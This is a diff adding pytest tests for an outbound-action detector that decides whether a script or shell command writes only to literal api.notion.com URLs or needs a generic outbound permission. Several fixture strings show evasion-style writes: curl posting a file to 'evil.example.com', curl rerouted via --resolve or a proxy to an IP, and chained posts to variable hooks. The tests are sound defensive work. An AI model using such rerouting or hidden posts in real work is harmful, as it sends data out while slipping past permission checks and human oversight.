@@ -243,3 +243,88 @@ class TestAllowableHttpHost:
     ])
     def test_not_allowable(self, key):
         assert allowable_http_host(key) is None
+
+
+class TestPerHostKeyNeedsLiteralTargets:
+    """outbound:http:<host> (always-allowable) only when EVERY write has a
+    literal target URL on that one host. A URL in a comment or an unrelated
+    string never makes a write to a variable target "literal to that host"."""
+
+    @pytest.mark.parametrize("text", [
+        # comment mentions notion, write goes to a variable
+        "# push to https://api.notion.com/v1/pages\nrequests.post(url, json=p)",
+        # unrelated string mentions notion
+        'DOCS = "https://api.notion.com/v1/pages"\nrequests.post(os.environ["HOOK"], json=p)',
+        # literal notion write plus a write to a variable
+        "requests.post('https://api.notion.com/v1/pages', json=p)\nrequests.post(target, json=p)",
+        # a client object posting to a variable is still a write
+        "requests.post('https://api.notion.com/v1/pages', json=p)\nclient.post(target, json=p)",
+        # string concatenation / formatting is not literal
+        "requests.post('https://api.notion.com/' + path, json=p)",
+        "requests.post('https://%s/v1/pages' % host, json=p)",
+        # f-string whose host part is not literal
+        'requests.post(f"https://api.notion.com{suffix}", json=p)',
+        'requests.post(f"https://{host}/v1/pages", json=p)',
+        # url passed late as keyword after other args
+        "requests.post(json=p, url=u)\n# https://api.notion.com",
+        # urllib with method= and a variable url
+        "req = urllib.request.Request(url, data=b, method='POST')\n# https://api.notion.com/v1",
+        # curl to a shell variable, notion only in a header
+        'curl -X POST "$URL" -H "Referer: https://api.notion.com" -d @p.json',
+        # curl schemeless target, notion only in a header
+        "curl -X POST evil.example.com -H 'Referer: https://api.notion.com' -d @p.json",
+        # curl connection redirected / proxied
+        "curl -X POST https://api.notion.com/v1/pages --resolve api.notion.com:443:203.0.113.9 -d @p",
+        "curl -x http://203.0.113.9:8080 -X POST https://api.notion.com/v1/pages -d @p",
+        # a later curl segment writing to a variable
+        "curl -X POST https://api.notion.com/v1/pages -d @p && curl -X POST $HOOK -d @p",
+        # curl run from Python with an argument list (not parsed as a shell call)
+        "requests.post('https://api.notion.com/v1/pages', json=p)\n"
+        "subprocess.run(['curl', '-X', 'POST', hook, '-d', body])",
+    ])
+    def test_non_literal_write_gets_generic_key(self, text):
+        found, key, _ = detect_outbound_action(text)
+        assert found and key == "outbound:http"
+
+    @pytest.mark.parametrize("text", [
+        "requests.post('https://api.notion.com/v1/pages', json=a)\n"
+        "requests.patch(\"https://api.notion.com/v1/pages/1\", json=b)",
+        'requests.post(f"https://api.notion.com/v1/pages/{pid}", json=b)',
+        "requests.post(url='https://api.notion.com/v1/pages', json=b)",
+        "httpx.post(\n    'https://api.notion.com/v1/pages',\n    json=b,\n)",
+        "req = urllib.request.Request('https://api.notion.com/v1/pages', data=b, method='POST')",
+        "curl -sS -X POST https://api.notion.com/v1/pages -H \"Authorization: Bearer $NOTION_TOKEN\" -d @p.json",
+        "curl -XPOST 'https://api.notion.com/v1/pages' --data-binary @p.json",
+        "http POST https://api.notion.com/v1/pages Authorization:\"Bearer $T\" title=x",
+        "wget --header 'Content-Type: application/json' --post-file p.json https://api.notion.com/v1/pages",
+    ])
+    def test_literal_writes_to_one_host_get_host_key(self, text):
+        found, key, _ = detect_outbound_action(text)
+        assert found and key == "outbound:http:api.notion.com"
+
+
+class TestCommandAndScriptsCombined:
+    def test_script_writing_to_variable_spoils_command_host(self, tmp_path):
+        (tmp_path / "sync.py").write_text("import requests\nrequests.post(HOOK, json=d)\n")
+
+        found, key, _ = detect_outbound_command(
+            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 sync.py", cwd=str(tmp_path))
+
+        assert found and key == "outbound:http"
+
+    def test_email_in_script_outranks_http_in_command(self, tmp_path):
+        (tmp_path / "mail.py").write_text("import smtplib\nsmtplib.SMTP('x')\n")
+
+        found, key, _ = detect_outbound_command(
+            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 mail.py", cwd=str(tmp_path))
+
+        assert found and key == "outbound:email"
+
+    def test_command_and_script_on_same_host_keep_host_key(self, tmp_path):
+        (tmp_path / "sync.py").write_text(
+            "import requests\nrequests.post('https://api.notion.com/v1/pages', json=d)\n")
+
+        found, key, _ = detect_outbound_command(
+            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 sync.py", cwd=str(tmp_path))
+
+        assert key == "outbound:http:api.notion.com"
